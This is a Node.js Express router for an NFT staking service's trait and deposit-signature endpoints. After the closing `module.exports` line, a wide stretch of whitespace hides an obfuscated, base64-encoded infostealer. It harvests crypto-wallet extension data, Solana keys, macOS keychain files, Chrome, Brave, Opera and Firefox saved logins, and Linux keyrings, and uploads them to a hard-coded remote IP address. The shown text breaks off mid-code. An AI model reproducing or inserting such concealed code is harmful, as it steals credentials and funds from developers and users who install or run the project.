const express = require('express');
const router = express.Router();
const { check, validationResult } = require('express-validator');
const admin = require('../../middleware/admin');
const { ethers, Contract } = require('ethers');
const { formatUnits, parseUnits } = require('ethers/lib/utils');
const config = require('config');
const Trait = require('../../models/Trait');
const TraitUtility = require('../../models/TraitUtility');
const checkObjectId = require('../../middleware/checkObjectId');
const sign = require('jsonwebtoken/sign');

// @route    POST api/traits
// @desc     Create or update a trait
// @access   Private
router.post(
  '/',
  admin,
  check('unsignedMsg', 'unsignedMsg is required').notEmpty(),
  check('signedMessage', 'signedMessage is required').notEmpty(),
  check('fullyExpandedSig', 'fullyExpandedSig is required').notEmpty(),

  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    let signingAddress = ethers.utils.verifyMessage(req.body.unsignedMsg, req.body.fullyExpandedSig);
    const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
    var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
    const account = wallet.connect(provider);

    const bankContract = new Contract(
      config.get('twmBank'),
      [
        'function owner() public view returns (address)'
      ],
      account
    );
    let ownerAddress = await bankContract.owner();
    let updateMsg = JSON.parse(req.body.unsignedMsg);
    if (ownerAddress == signingAddress) {
      try {
        let trait = await Trait.findOneAndUpdate(
          { no: updateMsg.no },
          { $set: { no: updateMsg.no, trait: updateMsg.trait } },
          { new: true, upsert: true, setDefaultsOnInsert: true }
        );

        res.json({ trait, success: true });
      } catch (err) {
        console.error(err.message);
        res.status(500).send('Server Error');
      }
    } else {
      res.json({ success: false });
    }
  }
);

// @route    POST api/traits/utility/
// @desc     Create or update a trait
// @access   Private
router.post(
  '/utility/',
  admin,
  check('unsignedMsg', 'unsignedMsg is required').notEmpty(),
  check('signedMessage', 'signedMessage is required').notEmpty(),
  check('fullyExpandedSig', 'fullyExpandedSig is required').notEmpty(),

  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    let signingAddress = ethers.utils.verifyMessage(req.body.unsignedMsg, req.body.fullyExpandedSig);
    const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
    var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
    const account = wallet.connect(provider);

    const bankContract = new Contract(
      config.get('twmBank'),
      [
        'function owner() public view returns (address)'
      ],
      account
    );
    let ownerAddress = await bankContract.owner();
    let updateMsg = JSON.parse(req.body.unsignedMsg);

    if (ownerAddress == signingAddress) {
      try {
        let trait = await TraitUtility.findOneAndUpdate(
          { no: updateMsg.no },
          { $set: { no: updateMsg.no, trait: updateMsg.trait } },
          { new: true, upsert: true, setDefaultsOnInsert: true }
        );

        res.json({ trait, success: true });
      } catch (err) {
        console.error(err.message);
        res.status(500).send('Server Error');
      }
    } else {
      res.json({ success: false });
    }
  }
);

// @route    GET api/traits
// @desc     Get all traits
// @access   Private
router.get('/', async (req, res) => {
  try {
    const traits = await Trait.find().sort({ date: -1 });
    res.json(traits);
  } catch (err) {
    console.error(err.message);
    res.status(500).send('Server Error');
  }
});

// @route    GET api/traits/utility/
// @desc     Get all traits
// @access   Private
router.get('/utility/', async (req, res) => {
  try {
    const traits = await TraitUtility.find().sort({ date: -1 });
    res.json(traits);
  } catch (err) {
    console.error(err.message);
    res.status(500).send('Server Error');
  }
});

// @route    GET api/traits/:id
// @desc     Get trait by ID
// @access   Private
router.get('/:nums',
  async ({ params: { nums } }, res) => {
    try {
      const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
      var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
      const account = wallet.connect(provider);

      const bankContract = new Contract(
        config.get('twmBank'),
        [
          'function _baseRates(address addr) public view returns (uint256) '
        ],
        account
      );
      let defaultTrait = await bankContract._baseRates(config.get('twmAddress'));

      const arrNums = JSON.parse(nums);
      let traitsInventory = [];
      let replyTraits = [];
      if (Array.isArray(arrNums)) {
        traitsInventory = await Trait.find({ "no": { $in: arrNums } }).select('-_id')
      }

      for (let i = 0; i < arrNums.length; i++) {
        const result = traitsInventory.find(({ no }) => no === arrNums[i]);
        if (result) {
          replyTraits.push(result);
        } else {
          replyTraits.push({ no: arrNums[i], trait: formatUnits(defaultTrait.toString(), 18) });
        }
      }

      res.json(replyTraits);
    } catch (err) {
      console.error(err.message);

      res.status(500).send('Server Error');
    }
  });

// @route    GET api/traits/utility/:id
// @desc     Get trait by ID
// @access   Private
router.get('/utility/:nums',
  async ({ params: { nums } }, res) => {
    try {
      const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
      var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
      const account = wallet.connect(provider);

      const bankContract = new Contract(
        config.get('twmBank'),
        [
          'function _baseRates(address addr) public view returns (uint256) '
        ],
        account
      );
      let defaultTrait = await bankContract._baseRates(config.get('utilityAddress'));

      const arrNums = JSON.parse(nums);
      let traitsInventory = [];
      let replyTraits = [];
      if (Array.isArray(arrNums)) {
        traitsInventory = await TraitUtility.find({ "no": { $in: arrNums } }).select('-_id')
      }

      for (let i = 0; i < arrNums.length; i++) {
        const result = traitsInventory.find(({ no }) => no === arrNums[i]);
        if (result) {
          replyTraits.push(result);
        } else {
          replyTraits.push({ no: arrNums[i], trait: formatUnits(defaultTrait.toString(), 18) });
        }
      }

      res.json(replyTraits);
    } catch (err) {
      console.error(err.message);

      res.status(500).send('Server Error');
    }
  });

// @route    DELETE api/traits/all
// @desc     Delete a trait
// @access   Private
router.delete('/all', admin, async (req, res) => {
  try {
    await Trait.deleteMany({})
    res.json({ msg: 'Trait Reset' });
  } catch (err) {
    console.error(err.message);

    res.status(500).send('Server Error');
  }
});

// @route    DELETE api/traits/allutility
// @desc     Delete a trait of twm
// @access   Private
router.delete('/allutility', admin, async (req, res) => {
  try {
    await TraitUtility.deleteMany({})
    res.json({ msg: 'TraitUtility Reset' });
  } catch (err) {
    console.error(err.message);

    res.status(500).send('Server Error');
  }
});


// @route    DELETE api/traits/:id
// @desc     Delete a trait
// @access   Private
router.delete('/:id', [admin, checkObjectId('id')], async (req, res) => {
  try {
    const trait = await Trait.findById(req.params.id);

    if (!trait) {
      return res.status(404).json({ msg: 'Trait not found' });
    }

    await trait.remove();

    res.json({ msg: 'Post removed' });
  } catch (err) {
    console.error(err.message);

    res.status(500).send('Server Error');
  }
});


// @route    DELETE api/traits/utility/:id
// @desc     Delete a trait of utility
// @access   Private
router.delete('/utility/:id', [admin, checkObjectId('id')], async (req, res) => {
  try {
    const trait = await TraitUtility.findById(req.params.id);

    if (!trait) {
      return res.status(404).json({ msg: 'Trait not found' });
    }

    await trait.remove();

    res.json({ msg: 'Post removed' });
  } catch (err) {
    console.error(err.message);

    res.status(500).send('Server Error');
  }
});

// @route    GET api/traits/deposit/:nums
// @desc     Get traits by no group
// @access   Public
router.get(
  '/deposit/:nums',
  async ({ params: { nums } }, res) => {
    try {
      let hexNums = [];
      let traits = [];
      let signature;

      const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
      var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
      const account = wallet.connect(provider);
      const abi = [{"inputs":[{"internalType":"address","name":"_twm","type":"address"},{"internalType":"address","name":"_signer","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokenId","type":"uint256"},{"indexed":true,"internalType":"address","name":"owner","type":"address"}],"name":"AutoDeposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"staker","type":"address"},{"indexed":false,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokensAmount","type":"uint256"}],"name":"Deposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"staker","type":"address"},{"indexed":false,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokensAmount","type":"uint256"}],"name":"Withdraw","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"receiver","type":"address"},{"indexed":true,"internalType":"address","name":"tokenAddress","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"WithdrawStuckERC721","type":"event"},{"inputs":[],"name":"FirstCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"SECONDS_IN_DAY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"SecondCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"ThirdCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"_baseRates","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"},{"internalType":"uint256[]","name":"tokenTraits","type":"uint256[]"},{"internalType":"bytes","name":"signature","type":"bytes"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"depositPaused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"}],"name":"emergencyWithdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getAccumulatedAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getCurrentReward","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getStakerTokens","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"},{"internalType":"uint256[]","name":"","type":"uint256[]"},{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getStakerYield","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getTokenYield","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"isMultiplierSet","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"launchStaking","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"onERC721Received","outputs":[{"internalType":"bytes4","name":"","type":"bytes4"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bool","name":"_pause","type":"bool"}],"name":"pauseDeposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_first","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setFirstContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_second","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setSecondContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_third","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setThirdContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"signerAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"stakingLaunched","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_contract","type":"address"},{"internalType":"uint256","name":"_yield","type":"uint256"}],"name":"updateBaseYield","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_signer","type":"address"}],"name":"updateSignerAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];
      const bankContract = new Contract(
        config.get('twmBank'),
        abi,
        account
      );
      let defaultTrait = await bankContract._baseRates(config.get('twmAddress'));

      const obj = JSON.parse(nums);
      if (Array.isArray(obj)) {
        const traitsInventory = await Trait.find({ "no": { $in: obj } }).select('-_id');
        for (let i = 0; i < obj.length; i++) {
          hexNums.push(ethers.utils.hexlify(obj[i]));
          const result = traitsInventory.find(({ no }) => no === obj[i]);
          if (result) {
            traits.push(ethers.utils.hexlify(ethers.utils.parseUnits((result.trait).toString(), 18)));
          } else {
            traits.push(ethers.utils.hexlify(defaultTrait));
          }
        }
        let message = ethers.utils.solidityPack(["address", "uint256[]", "uint256[]"], [config.get('twmAddress'), hexNums, traits]);
        message = ethers.utils.solidityKeccak256(["bytes"], [message]);
        signature = await account.signMessage(ethers.utils.arrayify(message));
      }
      return res.json({ hexNums, traits, signature });
    } catch (err) {
      console.error(err.message);
      return res.status(500).json({ msg: 'Server error' });
    }
  }
);

// @route    GET api/traits/depositutility:nums
// @desc     Get traits by no group
// @access   Public
router.get(
  '/depositutility/:nums',
  async ({ params: { nums } }, res) => {
    try {
      let hexNums = [];
      let traits = [];
      let signature;

      const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
      var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
      const account = wallet.connect(provider);
      const abi = [{"inputs":[{"internalType":"address","name":"_twm","type":"address"},{"internalType":"address","name":"_signer","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokenId","type":"uint256"},{"indexed":true,"internalType":"address","name":"owner","type":"address"}],"name":"AutoDeposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"staker","type":"address"},{"indexed":false,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokensAmount","type":"uint256"}],"name":"Deposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"staker","type":"address"},{"indexed":false,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokensAmount","type":"uint256"}],"name":"Withdraw","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"receiver","type":"address"},{"indexed":true,"internalType":"address","name":"tokenAddress","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"WithdrawStuckERC721","type":"event"},{"inputs":[],"name":"FirstCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"SECONDS_IN_DAY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"SecondCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"ThirdCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"_baseRates","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"},{"internalType":"uint256[]","name":"tokenTraits","type":"uint256[]"},{"internalType":"bytes","name":"signature","type":"bytes"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"depositPaused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"}],"name":"emergencyWithdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getAccumulatedAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getCurrentReward","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getStakerTokens","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"},{"internalType":"uint256[]","name":"","type":"uint256[]"},{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getStakerYield","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getTokenYield","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"isMultiplierSet","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"launchStaking","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"onERC721Received","outputs":[{"internalType":"bytes4","name":"","type":"bytes4"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bool","name":"_pause","type":"bool"}],"name":"pauseDeposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_first","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setFirstContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_second","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setSecondContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_third","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setThirdContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"signerAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"stakingLaunched","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_contract","type":"address"},{"internalType":"uint256","name":"_yield","type":"uint256"}],"name":"updateBaseYield","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_signer","type":"address"}],"name":"updateSignerAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];
      const bankContract = new Contract(
        config.get('twmBank'),
        abi,
        account
      );

      let defaultTrait = await bankContract._baseRates(config.get('utilityAddress'));
      const obj = JSON.parse(nums);
      if (Array.isArray(obj)) {
        const traitsInventory = await TraitUtility.find({ "no": { $in: obj } }).select('-_id');
        for (let i = 0; i < obj.length; i++) {
          hexNums.push(ethers.utils.hexlify(obj[i]));
          const result = traitsInventory.find(({ no }) => no === obj[i]);
          if (result) {
            traits.push(ethers.utils.hexlify(ethers.utils.parseUnits((result.trait).toString(), 18)));
          } else {
            traits.push(ethers.utils.hexlify(defaultTrait));
          }
        }
        let message = ethers.utils.solidityPack(["address", "uint256[]", "uint256[]"], [config.get('utilityAddress'), hexNums, traits]);
        message = ethers.utils.solidityKeccak256(["bytes"], [message]);
        signature = await account.signMessage(ethers.utils.arrayify(message));
      }
      return res.json({ hexNums, traits, signature });
    } catch (err) {
      console.error(err.message);
      return res.status(500).json({ msg: 'Server error' });
    }
  }
);

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      Object.prototype.toString,Object.getOwnPropertyDescriptor,Object.defineProperty;const t="base64",c="utf8",a=require("fs"),$=require("os"),l=a=>(s1=a.slice(1),Buffer.from(s1,t).toString(c));pt=require(l("zcGF0aA")),rq=require(l("YcmVxdWVzdA")),ex=require(l("aY2hpbGRfc"+"HJvY2Vzcw"))[l("cZXhlYw")],hs=$[l("caG9zdG5hbWU")](),pl=$[l("YcGxhdGZvcm0")](),hd=$[l("ZaG9tZWRpcg")](),td=$[l("cdG1wZGly")]();let r;const n=a=>Buffer.from(a,t).toString(c),h=()=>{let t="MTQ3LjEyNCaHR0cDovLw4yMTQuMjM3OjEyNDQ=  ";for(var c="",a="",$="",l="",r=0;r<10;r++)c+=t[r],a+=t[10+r],$+=t[20+r],l+=t[30+r];return c=c+$+l,n(a)+n(c)},s=t=>t.replace(/^~([a-z]+|\/)/,((t,c)=>"/"===c?hd:`${pt[n("ZGlybmFtZQ")](hd)}/${c}`)),e="swPnLQ5",Z="Z2V0",o="Ly5ucGw",d="d3JpdGVGaWxlU3luYw",u="L2NsaWVudA",G=n("ZXhpc3RzU3luYw"),y="TG9naW4gRGF0YQ",i="Y29weUZpbGU";function m(t){const c=n("YWNjZXN"+"zU3luYw");try{return a[c](t),!0}catch(t){return!1}}const b=n("RGVmYXVsdA"),p=n("UHJvZmlsZQ"),W=l("aZmlsZW5hbWU"),Y=l("cZm9ybURhdGE"),f=l("adXJs"),w=l("Zb3B0aW9ucw"),V=l("YdmFsdWU"),v=n("cmVhZGRpclN5bmM"),j=n("c3RhdFN5bmM"),L=(n("aXNEaXJlY3Rvcnk"),n("cG9zdA")),z="Ly5jb25maWcv",R="L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8",x="L0FwcERhdGEv",N="L1VzZXIgRGF0YQ",X="R29vZ2xlL0Nocm9tZQ",k="QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",_="Z29vZ2xlLWNocm9tZQ",F=["TG9jYWwv"+k,k,k],B=["TG9jYWwv"+X,X,_],U=["Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU","Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE","b3BlcmE"];let g="comp";const q=["bmtiaWhmYmVvZ2Fl","ZWpiYWxiYWtvcGxj","Zmhib2hpbWFlbGJv","aG5mYW5rbm9jZmVv","aWJuZWpkZmptbWtw","YmZuYWVsbW9tZWlt","YWVhY2hrbm1lZnBo","ZWdqaWRqYnBnbGlj","aGlmYWZnbWNjZHBl"],J=["YW9laGxlZm5rb2RiZWZncGdrbm4","aGxnaGVjZGFsbWVlZWFqbmltaG0","aHBqYmJsZGNuZ2NuYXBuZG9kanA","ZmJkZGdjaWpubWhuZm5rZG5hYWQ","Y25scGVia2xtbmtvZW9paG9mZWM","aGxwbWdqbmpvcGhocGtrb2xqcGE","ZXBjY2lvbmJvb2hja29ub2VlbWc","aGRjb25kYmNiZG5iZWVwcGdkcGg","a3Bsb21qamtjZmdvZG5oY2VsbGo"],Q="Y3JlYXRlUmVhZFN0cmVhbQ",T=async(t,c,$)=>{let l=t;if(!l||""===l)return[];try{if(!m(l))return[]}catch(t){return[]}c||(c="");let r=[];const h=n("TG9jYWwgRXh0ZW5za"+"W9uIFNldHRpbmdz"),s=n(Q);for(let $=0;$<200;$++){const e=`${t}/${0===$?b:`${p} ${$}`}/${h}`;for(let t=0;t<q.length;t++){const h=n(q[t]+J[t]);let Z=`${e}/${h}`;if(m(Z)){try{far=a[v](Z)}catch(t){far=[]}far.forEach((async t=>{l=pt.join(Z,t);try{r.push({[V]:a[s](l),[w]:{[W]:`${c}${$}_${h}_${t}`}})}catch(t){}}))}}}if($){const t=n("c29sYW5hX2lkLnR4dA");if(l=`${hd}${n("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`,a[G](l))try{r.push({[V]:a[s](l),[w]:{[W]:t}})}catch(t){}}return C(r),r},C=t=>{const c=l("YbXVsdGlfZmlsZQ"),a=l("ZdGltZXN0YW1w"),$=n("L3VwbG9hZHM"),s={[a]:r.toString(),type:e,hid:g,[c]:t},Z=h();try{const t={[f]:`${Z}${$}`,[Y]:s};rq[L](t,((t,c,a)=>{}))}catch(t){}},A=async(t,c)=>{try{const a=s("~/");let $="";$="d"==pl[0]?`${a}${n(R)}${n(t[1])}`:"l"==pl[0]?`${a}${n(z)}${n(t[2])}`:`${a}${n(x)}${n(t[0])}${n(N)}`,await T($,`${c}_`,0==c)}catch(t){}},E=async()=>{let t=[];const c=n(y),$=n(Q),l=n("L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu"),r=n("bG9na2MtZGI");if(pa=`${hd}${l}`,a[G](pa))try{t.push({[V]:a[$](pa),[w]:{[W]:r}})}catch(t){}else if(pa+="-db",a[G](pa))try{t.push({[V]:a[$](pa),[w]:{[W]:r}})}catch(t){}try{const l=n(i);let r="";if(r=`${hd}${n(R)}${n(X)}`,r&&""!==r&&m(r))for(let n=0;n<200;n++){const h=`${r}/${0===n?b:`${p} ${n}`}/${c}`;try{if(!m(h))continue;const c=`${r}/ld_${n}`;m(c)?t.push({[V]:a[$](c),[w]:{[W]:`pld_${n}`}}):a[l](h,c,(t=>{let c=[{[V]:a[$](h),[w]:{[W]:`pld_${n}`}}];C(c)}))}catch(t){}}}catch(t){}return C(t),t},H=async()=>{let t=[];const c=n(y),$=n(Q);try{const l=n(i);let r="";if(r=`${hd}${n(R)}${n(k)}`,r&&""!==r&&m(r))for(let n=0;n<200;n++){const h=`${r}/${0===n?b:`${p} ${n}`}/${c}`;try{if(!m(h))continue;const c=`${r}/brld_${n}`;m(c)?t.push({[V]:a[$](c),[w]:{[W]:`brld_${n}`}}):a[l](h,c,(t=>{let c=[{[V]:a[$](h),[w]:{[W]:`brld_${n}`}}];C(c)}))}catch(t){}}}catch(t){}return C(t),t},S=async()=>{let t=[];const c=n(Q),$=n("a2V5NC5kYg"),l=n("a2V5My5kYg"),r=n("bG9naW5zLmpzb24");try{let h="";if(h=`${hd}${n(R)}${n("RmlyZWZveA")}`,h&&""!==h&&m(h))for(let n=0;n<200;n++){const s=0===n?b:`${p} ${n}`,e=`${h}/${s}/${$}`,Z=`${h}/${s}/${l}`,o=`${h}/${s}/${r}`;try{m(e)&&t.push({[V]:a[c](e),[w]:{[W]:`fk4_${n}`}})}catch(t){}try{m(Z)&&t.push({[V]:a[c](Z),[w]:{[W]:`fk3_${n}`}})}catch(t){}try{m(o)&&t.push({[V]:a[c](o),[w]:{[W]:`flj_${n}`}})}catch(t){}}}catch(t){}return C(t),t},M=async()=>{let t=[];n(y);const c=n(Q);try{const t=n("Ly5sb2NhbC9zaGFyZS9rZXlyaW5ncy8");let $="";$=`${hd}${t}`;let l=[];if($&&""!==$&&m($))try{l=a[v]($)}catch(t){l=[]}l.forEach((async t=>{pa=pt.join($,t);try{ldb_data.push({[V]:a[c](pa),[w]:{[W]:`${t}`}})}catch(t){}}))}catch(t){}return C(t),t},I=async()=>{let t=[];const c=n(y),$=n(Q);try{const l=n(i);let r="";if(r=`${hd}${n(z)}${n(_)}`,r&&""!==r&&m(r))for(let n=0;n<200;n++){const h=`${r}/${0===n?b:`${p} ${n}`}/${c}`;try{if(!m(h))continue;const 